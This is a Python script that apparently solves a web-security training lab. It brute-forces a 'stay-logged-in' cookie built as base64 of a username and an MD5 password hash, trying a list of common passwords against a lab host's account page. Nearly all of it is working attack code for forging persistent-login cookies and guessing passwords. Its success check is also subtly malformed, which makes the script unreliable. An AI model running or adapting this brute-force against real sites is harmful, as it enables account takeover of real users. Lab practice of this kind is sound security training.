import requests
import hashlib
import base64

# Target setup
base_url = 'https://0a0f001c03ef8035cc0031990079005b.web-security-academy.net'
session_cookie = 'PJe5JlEDGQBLwXQiWlxuomOTyEJHsM4y'
username = "carlos"

# Password list (you can replace this with a wordlist)
passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop",
    "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000",
    "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert",
    "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle",
    "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie",
    "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole",
    "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor",
    "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"
]


# Prepare session
session = requests.Session()

print("Starting cookie brute-force...")

for password in passwords:
    # Generate md5 hash of password
    md5_hash = hashlib.md5(password.encode()).hexdigest()
    
    # Construct stay-logged-in cookie
    raw_cookie = f"{username}:{md5_hash}"
    encoded_cookie = base64.b64encode(raw_cookie.encode()).decode()

    # Set cookies
    cookies = {
        'stay-logged-in': encoded_cookie,
        'session': session_cookie
    }

    # Send a GET request (not login) to check if cookie works
    response = session.get(f"{base_url}/my-account", cookies=cookies)

    print(f"Trying password: {password} | Cookie: {encoded_cookie} | Status: {response.status_code}")

    # Adjust success condition as needed
    if "My Account" in response.text in response.text:
        print(f"\n[✓] SUCCESS! Valid password for {username}: {password}")
        print(f"    Cookie: {encoded_cookie}")
        break
else:
    print("\n[x] Failed to find valid password.")
